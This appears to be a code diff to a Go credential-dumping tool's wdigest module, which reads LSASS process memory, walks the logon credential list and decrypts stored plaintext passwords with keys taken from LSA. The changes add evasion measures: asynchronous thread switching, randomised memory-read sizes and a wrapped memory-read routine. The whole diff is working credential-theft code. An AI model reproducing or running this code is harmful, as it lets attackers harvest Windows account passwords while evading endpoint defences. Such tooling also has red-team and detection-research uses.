@@ -13,6 +13,7 @@ import (
 
 	"project/internal/logger"
 	"project/internal/module/windows/api"
+	"project/internal/security"
 )
 
 type wdigest struct {
@@ -138,13 +139,15 @@ var (
 )
 
 func (wdigest *wdigest) searchAddresses(pHandle windows.Handle) error {
+	done := security.SwitchThreadAsync()
+	defer wdigest.ctx.waitSwitchThreadAsync(done)
 	module, err := wdigest.ctx.lsass.GetBasicModuleInfo(pHandle, "wdigest.DLL")
 	if err != nil {
 		return err
 	}
 	// read wdigest.dll memory
-	memory := make([]byte, module.size)
-	size := uintptr(module.size)
+	size := uintptr(module.size - (256 - wdigest.ctx.rand.Int(256)))
+	memory := make([]byte, size)
 	_, err = api.ReadProcessMemory(pHandle, module.address, &memory[0], size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
@@ -165,7 +168,7 @@ func (wdigest *wdigest) searchAddresses(pHandle windows.Handle) error {
 	address := module.address + uintptr(index+patch.offsets.off0)
 	var offset int32
 	size = unsafe.Sizeof(offset)
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
+	err = wdigest.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about wdigest credential address")
 	}
@@ -201,10 +204,13 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 			return nil, errors.WithMessage(err, "failed to search wdigest credential address")
 		}
 	}
+	done := security.SwitchThreadAsync()
+	defer wdigest.ctx.waitSwitchThreadAsync(done)
 	// read wdigest credential data address
 	address := wdigest.credAddress
 	var addr uintptr
-	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
+	size := unsafe.Sizeof(addr)
+	err := wdigest.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest credential list address")
 	}
@@ -224,7 +230,7 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 		}
 		var entry wdigestListEntry
 		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
-		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
+		err = wdigest.ctx.readMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
 		if err != nil {
 			break
 		}
@@ -241,8 +247,8 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 	// read primary credential
 	var cred genericPrimaryCredential
 	credAddr := uintptr(int(resultAddr) + wdigest.primaryOffset)
-	size := uintptr(wdigest.primaryOffset + int(unsafe.Sizeof(cred)))
-	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
+	size = uintptr(wdigest.primaryOffset + int(unsafe.Sizeof(cred)))
+	err = wdigest.ctx.readMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
 	}
@@ -250,12 +256,15 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest credential username")
 	}
-	// if username == "" {
-	// 	return nil, nil
-	// }
+	if username == "" {
+		username = "(null)"
+	}
 	domain, err := wdigest.ctx.readLSAUnicodeString(pHandle, &cred.Domain)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read wdigest credential domain")
+	}
+	if domain == "" {
+		domain = "(null)"
 	}
 	w := Wdigest{
 		Domain:   domain,
@@ -264,15 +273,17 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 	// read encrypted password
 	lus := cred.Password
 	if lus.MaximumLength != 0 {
+		done := security.SwitchThreadAsync()
+		defer wdigest.ctx.waitSwitchThreadAsync(done)
+		// read encrypted password
 		encPassword := make([]byte, int(lus.MaximumLength))
 		size = uintptr(lus.MaximumLength)
-		_, err = api.ReadProcessMemory(pHandle, lus.Buffer, &encPassword[0], size)
+		err = wdigest.ctx.readMemory(pHandle, lus.Buffer, &encPassword[0], size)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to read wdigest credential encrypted password")
 		}
 		pwd := make([]byte, len(encPassword))
-		// iv will be changed, so we need copy
-		// TODO call function
+		// iv will be changed after call api.BCryptDecrypt, so we need copy it
 		iv := make([]byte, 8)
 		copy(iv, wdigest.ctx.lsaNT6.iv[:8])
 		_, err = api.BCryptDecrypt(wdigest.ctx.lsaNT6.key3DES, encPassword, 0, iv, pwd)
@@ -285,6 +296,12 @@ func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID
 		sh.Cap = int(lus.Length / 2)
 		sh.Data = uintptr(unsafe.Pointer(&pwd[0]))
 		w.Password = string(utf16.Decode(utf16Str))
+		if w.Password == "" {
+			w.Password = "(null)"
+		}
+
+	} else {
+		w.Password = "(not found)"
 	}
 	return &w, nil
 }
